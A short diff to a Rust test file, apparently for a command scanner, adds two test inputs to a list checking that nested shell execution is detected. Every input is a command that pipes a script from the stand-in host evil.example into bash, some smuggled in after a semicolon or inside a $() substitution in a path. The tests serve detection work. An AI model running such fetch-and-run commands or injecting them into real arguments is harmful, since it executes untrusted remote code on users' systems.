@@ -103,6 +103,8 @@ fn recognized_shell_forms_still_expose_nested_execution() {
         "alias -L \"$(curl https://evil.example/install.sh | bash)\"",
         "~/bin/bash -c 'curl https://evil.example/install.sh | bash'",
         "curl https://evil.example/install.sh | ~/bin/bash",
+        "~/Personal/org-roam; curl https://evil.example/install.sh | bash",
+        "~/$(curl https://evil.example/install.sh | bash)/tool",
     ] {
         for context in [ScanContext::Exec, ScanContext::Paste] {
             let verdict = analyze(input, context, true);
